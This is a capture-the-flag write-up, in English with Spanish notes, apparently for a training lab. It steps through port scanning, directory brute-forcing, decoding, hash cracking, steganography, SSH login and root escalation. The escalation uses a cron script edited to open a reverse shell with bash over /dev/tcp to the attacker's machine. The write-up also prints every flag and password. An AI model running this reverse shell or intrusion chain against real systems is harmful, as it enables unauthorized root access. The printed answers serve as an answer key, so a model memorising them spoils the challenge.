

## Task 1  Enumeration through Nmap

```

```


  
**How many ports are open?**  

3

**What is the version of nginx?**  

1.16.1

```
curl -I http://10.10.72.9:80
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Tue, 19 Mar 2024 02:09:30 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Mon, 15 Jun 2020 00:02:19 GMT
Connection: keep-alive
ETag: "5ee6ba8b-264"
Accept-Ranges: bytes

```

**What is running on the highest port?**

Apache

```
curl -I http://10.10.72.9:65524
HTTP/1.1 200 OK
Date: Tue, 19 Mar 2024 02:10:21 GMT
Server: Apache/2.4.43 (Ubuntu)
Last-Modified: Mon, 15 Jun 2020 07:58:17 GMT
ETag: "2a42-5a81aca26e817"
Accept-Ranges: bytes
Content-Length: 10818
Vary: Accept-Encoding
Content-Type: text/html

```


## Task 2 Compromising the machine 

### Answer the questions below

#### Using GoBuster, find flag 1.

flag{f1rs7_fl4g} 

```
gobuster dir -u http://10.10.72.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 120
/hidden               (Status: 301) [Size: 169] [--> http://10.10.72.9/hidden/]


gobuster dir -u http://10.10.72.9/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250
/whatever

http://10.10.72.9/hidden/whatever/
http://10.10.72.9/hidden/whatever/robots.txt

<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>

echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d
flag{f1rs7_fl4g} 

```


#### Further enumerate the machine, what is flag 2?

flag{1m_s3c0nd_fl4g}


```
curl  10.10.72.9:65524/robots.txt
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions                                                     
```

```
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a18672860d0510e5ab6699730763b250

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```
https://md5.gromweb.com/
https://md5hashing.net/


#### Crack the hash with easypeasy.txt, What is the flag 3
- no hubo necesidad de crackear es tal cual

flag{9fdafbd64c47471a8f54cd3fc64cd312}

```
 <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
			   *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
```

```
john --list=formats
john --list=formats | grep -i md5


```


#### What is the hidden directory?

/n0th1ng3ls3m4tt3r

```
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

- estaba en base62, con cybercfef

#### Using the wordlist that provided to you in this task crack the hash

- se muestra una imagen, steghide pide password
```

```

 ```
 <body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
```

- el hash es tipo ghost

```
hash-identifier                                                        
   
 HASH: 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))

```

- lo crackeamos con la wordlist que nos dieron o rockyu
```
john --format=gost hash -w=~/shared/easypeasy.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2024-03-18 21:59) 100.0g/s 514100p/s 514100c/s 514100C/s 123456..sunshine
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

- sacamos la info de la imagen con steghide y el password sacado del hash crackeado
- 
```
steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob 
wrote extracted data to "secrettext.txt".
cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

iconvertedmypasswordtobinary
```

### What is the password to login to the machine via SSH?
iconvertedmypasswordtobinary


#### What is the user flag?
```
ssh boring@10.10.72.9 -p 6498                                     
The authenticity of host '[10.10.72.9]:6498 ([10.10.72.9]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.72.9]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.72.9's password: 
```

```
cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}

```

- rot13
flag{n0wits33msn0rm4l}


#### What is the root flag?

- revisamos cronjobs
```
cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

```

```
cat .mysecretcronjob.sh 
#!/bin/bash
# i will run as root
bash -i >& /dev/tcp/10.2.116.74/4242 0>&1

```

```
nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.2.116.74] from (UNKNOWN) [10.10.72.9] 51894
bash: cannot set terminal process group (1519): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# cd /root
cd /root
root@kral4-PC:~# ls -a
ls -a
.
..
.bash_history
.bashrc
.cache
.gnupg
.local
.profile
.root.txt
.selected_editor
root@kral4-PC:~# cat .root.txt  
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}

```
